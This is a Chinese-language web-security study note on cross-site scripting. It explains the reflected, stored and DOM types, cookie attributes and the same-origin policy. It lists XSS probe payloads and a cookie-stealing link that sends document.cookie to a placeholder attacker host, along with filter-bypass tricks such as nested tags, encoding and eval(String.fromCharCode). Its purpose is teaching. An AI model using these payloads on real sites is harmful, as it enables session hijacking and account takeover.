## Cross-Site Scripting  
[同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)  
XSS是發生在前端的，讓瀏覽器去執行攻擊代碼。使用腳本附加在連結或文本中可以讀取本地cookie或者擷取封包, 常見的防禦手勢就是使用**http-only**來限制http protocol才能訪問cookie內容, 以及使用**https**安全協定!  
1. reflected xss (非持久型):  
我將引用[The web application hackers handbook](https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470)裡面的例子來解釋  
```js
url/error?message=an+error+occurred
// 頁面裡的html則是<p>an error occured</p>
```  
於是這邊我們就可以合理懷疑，頁面是將變數message的值複製到標籤中。reflected xss漏洞就在這邊，我們可以將<script>alert(1)</script>直接注入到url中的message參數(沒有過濾的話)，一個內容是1的彈窗馬上就會出現！  
Server收到**偽造的攻擊request**並且response，這就是reflected xss  
  
2. stored xss (持久型):  
Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內容  
  
3. DOM xss:  
在DOM元素中加入事件, 觸發script.  
注意: reflective型 以及 stored型 才會與server有互動，因為server需要解析惡意代碼，而DOM型則是完全由客戶端js執行。  

### XSS Vulnerability exists?
這裡先不談XSS探針...  
我習慣直接注入sciprt語句作測試，常見語句如下:  
```js
<script>alert(/1/);<script>
<script>a=prompt;a(1)</script>
<img src=1 onmouseover=alert(1)>
<img src=1 onerror=confirm(1)>
<img src="javascript:alert(1);">
<a href=1 onload=alert(1)>hi</a>
```
從上面我可以大致推斷攻擊代碼多為直接彈窗，或者觸發事件!  

### XSS and Cookie
Cookie format: ```key: value```  
當client端向server端發出請求時，server會回傳一個set-cookie的標頭  
```set-cookie(name, expires, path, domain, secure, httponly) // 除了name後面幾個參數不一定要給值```  
```expires```: 若未設定，則是**End of Browser Session**，瀏覽器一關閉就會刪除!  
```secure```: 限定在https中傳輸  
```httponly```: 限制js去存取cookie  
[cookie reference](https://www.csie.ntu.edu.tw/~r92092/html/tech/cookie.html)  
如何hijack user's cookie?  
1. 上面有提到user在登入後就會拿到一個帶有session token的```set-cookie```標頭  
2. hacker把惡意連結餵給user：  
```php
url/hi?message=<script>var+i=new+Image;+i.src="attacker_url/"+document.cookie;</script>
```
3. user用惡意連結對server發出請求  
server會執行以上js代碼對hacker的host發出請求，其中就帶有user的token：  
```php
GET /sessId=xxxxxxxxxxxxxxxxxxxx HTTP/1.1
Host: attacker_url
```
[MYTH]為何不直接構造```attacker_url/hi?message=<script>...</script>```就好？何必要去server端找xss漏洞？  
這關係到**同源政策**：cookie只能回傳到當初發送它的domain，也只能accessed by 該domain頁面的javascript!  
我們在回到上面的惡意連結：user送出惡意構造的要求，該domain server回傳一個包含該javascript的頁面  
**到這裡, server已經信任這個js跟它是同源的！所以也會執行把cookie發送出去...**

### 常見限制 < 對抗手勢
* filter 對一些危險標籤做過濾  
  * 大小寫混用  
  * 一次過濾繞過 e.g.```<scr<script>ipt>```  
  * 不如換個方式不使用到限制字符 e.g.```<img src=1 onerror=alert(1)>```
* encode 轉譯危險標籤  
  * url encode: % + ASCII(hex) ```%3Cscript%3E```  
  補充js常見處理函式: ```escape()/unescape(), encodeURL()/decodeURL(), encodeURLComponent()/decodeURLComponent()```  
  * html encode  
  * unicode encode: %u + ASCII(hex)  
  * ascii encode  
  ```js
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
  // <script>alert(1)</script>
  ```
  String.fromCharCode() 將unicode字碼轉換成字串 [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() 執行參數中的js語句 [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* length limit  
  * 外部引入自己的script ```<script src=".js"></script>```  
* 未過濾\n類符號  
```js
<img src="javas
cript:
alert(/1/);">
```  
### Reference
1. The Web Application Hacker's Handbook
